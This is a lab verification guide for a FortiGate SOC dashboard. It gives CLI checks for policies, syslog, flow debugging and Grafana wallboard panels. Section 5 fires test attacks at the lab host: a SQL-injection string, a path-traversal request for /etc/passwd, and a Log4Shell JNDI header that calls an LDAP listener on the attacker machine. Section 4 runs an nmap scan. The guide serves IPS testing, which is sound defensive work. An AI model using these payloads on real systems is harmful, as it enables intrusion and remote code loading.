<!-- filepath: https://github.com/rabakuku/Youtube/blob/main/Video-3-Visual-SOC-Analytics-Traffic-Dashboard/docs/vt.md -->
# FortiGate Zero-Trust Verification — Visual SOC (FortiOS 7.4.12)

Run these after `docs/Fortinet-cli.md`. Each check lists the command, where to run it, and what good output looks like. Container-side checks live in `scripts/vt.md`.

> **Not used in this lab:** REST API admins and automation stitches. The `diagnose test application autod` and API `curl` checks from the standard template therefore do not apply here.

---

## 1. Configuration review (FortiGate)

```text
get system interface | grep -E "vlan10-siem|vlan40-kali"
show firewall address SOC-Host
show ips sensor SOC-Demo-IPS
show firewall policy
get router info routing-table all
get log syslogd setting
get log syslogd filter
```

**Expect:**
- Both VLAN interfaces `up` with 192.168.10.1 and 192.168.40.1.
- Policy list order: 1, 2, **3 after 2**, 4. Policy 2 shows `set ips-sensor "SOC-Demo-IPS"`; policy 3 shows `set action deny` and `set logtraffic all`.
- Routing table: `C 192.168.10.0/24 is directly connected, vlan10-siem` and `C 192.168.40.0/24 ... vlan40-kali`, plus a default route via port1.
- Syslog: `status: enable`, `server: 192.168.10.2`, `mode: udp`, `port: 514`, `source-ip: 192.168.10.1`.

---

## 2. Syslog is leaving the FortiGate (FortiGate)

```text
diagnose sniffer packet any 'udp and port 514' 4 10 l
```

In a second session (or right before), generate logs:

```text
diagnose log test
```

**Expect:** lines like `vlan10-siem out 192.168.10.1.xxxxx -> 192.168.10.2.514: udp ...`. No packets → section 5 of the CLI guide was not applied, or `source-ip` points to an address that is not on the FortiGate.

On **Alpine**, confirm they arrive and are stored:

```sh
tcpdump -ni eth0 udp port 514 -c 5
curl -sG http://127.0.0.1:3100/loki/api/v1/query \
  --data-urlencode 'query=sum by (log_type) (count_over_time({source="fortigate"}[5m]))'
```

**Expect:** a non-zero count for `traffic`, `event` and `utm` after `diagnose log test`.

---

## 3. Allowed path: Kali → Grafana (policy 2)

On **Kali**:

```sh
curl -I http://192.168.10.2
```

**Expect:** `HTTP/1.1 302 Found` with `Location: /login`.

On the **FortiGate**, while the curl runs:

```text
diagnose sys session filter clear
diagnose sys session filter daddr 192.168.10.2
diagnose sys session filter dport 80
diagnose sys session list
```

**Expect:** a session with `policy_id=2`, `proto=6`, `192.168.40.3:xxxxx->192.168.10.2:80`.

Packet view of the same flow on the trunk and both VLANs:

```text
diagnose sniffer packet port2 'host 192.168.10.2 and port 80' 4 10 l
diagnose sniffer packet vlan40-kali 'host 192.168.40.3 and port 80' 4 10 l
diagnose sniffer packet vlan10-siem 'host 192.168.10.2 and port 80' 4 10 l
```

**Expect:** SYN in on `vlan40-kali`, SYN out on `vlan10-siem`, SYN-ACK back.

---

## 4. Denied path: Kali → anything else in VLAN 10 (policy 3)

On **Kali**:

```sh
nmap -Pn -p 22,443,3100,3389 192.168.10.2
```

**Expect:** every port reported `filtered`. (3100 must be filtered too — Loki is not exposed.)

On the **FortiGate**:

```text
diagnose debug flow filter clear
diagnose debug flow filter addr 192.168.40.3
diagnose debug flow filter port 22
diagnose debug flow show function-name enable
diagnose debug flow trace start 10
diagnose debug enable
```

Re-run `nmap -Pn -p 22 192.168.10.2` on Kali, then stop the debug:

```text
diagnose debug disable
diagnose debug flow trace stop
diagnose debug reset
```

**Expect:** `Denied by forward policy check (policy 3)`. If it says `policy 0` you are hitting the implicit deny — policy 3 is missing or below a broader rule.

Read the stored deny logs:

```text
execute log filter reset
execute log filter category 0
execute log filter field policyid 3
execute log display
```

**Expect:** entries with `action="deny" policyid=3 policyname="Kali_To_Servers_Deny"`. (`category 0` = traffic. If your build numbers categories differently, run `execute log filter category ?`.)

---

## 5. IPS path: web attack on port 80 (policy 2 + SOC-Demo-IPS)

On **Kali** (aimed only at the lab host):

```sh
curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.10.2/?id=1%27%20OR%20%271%27=%271"
curl -s -o /dev/null -w '%{http_code}\n' "http://192.168.10.2/../../../../etc/passwd"
curl -s -o /dev/null -w '%{http_code}\n' -H 'X-Api-Version: ${jndi:ldap://192.168.40.3:1389/a}' http://192.168.10.2/
```

**Expect:** some requests hang or return `000` (connection reset by IPS) instead of `302`/`404`.

On the **FortiGate**:

```text
execute log filter reset
execute log filter category 4
execute log display
```

**Expect:** IPS log entries (`type="utm" subtype="ips"`) with `attack="..."` and `action="dropped"` or `"reset"`. Category 4 is IPS on 7.4; confirm with `execute log filter category ?`.

GUI view: **Log & Report → Security Events → Intrusion Prevention**.

---

## 6. Wallboard sanity check

Open `http://192.168.10.2` on Kali and log in. After sections 3–5:

| Panel | Should show |
|---|---|
| THREAT LEVEL | ELEVATED or UNDER ATTACK, back to ALL CLEAR ~60 s after you stop |
| Blocked (5m) | > 0 |
| IPS Detections (5m) | > 0 (only if section 5 produced IPS logs) |
| Top Attacker IPs | 192.168.40.3 |
| Top Scanned Ports | 22, 443, 3100, 3389 |
| Traffic by Firewall Policy | Kali_To_Servers_Deny (red) and Kali_To_SOC_Web (green) |
| Live SOC Event Stream | red `BLOCKED` lines with `policy=3`, `IPS:` lines for section 5 |

---

## 7. Symptom → fix

| Symptom | Likely cause | Fix |
|---|---|---|
| No packets in the UDP 514 sniffer | Syslog disabled or wrong server | Re-apply CLI section 5; `get log syslogd setting` |
| Packets on the FortiGate, nothing on Alpine | Alpine firewall/other syslog daemon, or wrong IP | `tcpdump` on Alpine; `scripts/vt.md` UDP 514 row |
| Wallboard Events move but Blocked stays 0 | Policy 3 missing, below another rule, or `logtraffic` not `all` | `show firewall policy 3`; `move 2 before 3`; remove old allow-any rules |
| Flow debug says `policy 0` | Implicit deny is matching | Policy 3 missing or interfaces wrong (`srcintf vlan40-kali`, `dstintf vlan10-siem`) |
| Kali gets no answer on `curl -I http://192.168.10.2` | Policy 2 missing / dstaddr wrong / Grafana down | Flow debug on port 80; `docker compose ps` on Alpine |
| IPS panels empty, attacks return 302 | IPS not on policy 2, or definitions too old | `show firewall policy 2` must contain `ips-sensor`; `diagnose autoupdate versions` |
| Kali can reach the FortiGate GUI | `https`/`ssh` still allowed on `vlan40-kali` | `set allowaccess ping` on that interface |
| Alpine `apk update` fails | Policy 4 missing or DNS blocked | `show firewall policy 4`; check service list includes `DNS` |
| Wallboard flooded with internet traffic | Policies 1/4 logging all sessions | `set logtraffic utm` on policies 1 and 4 |
| Sample data with odd IPs on the wallboard | Leftovers from `diagnose log test` | Normal; it ages out of the 15-minute panels |
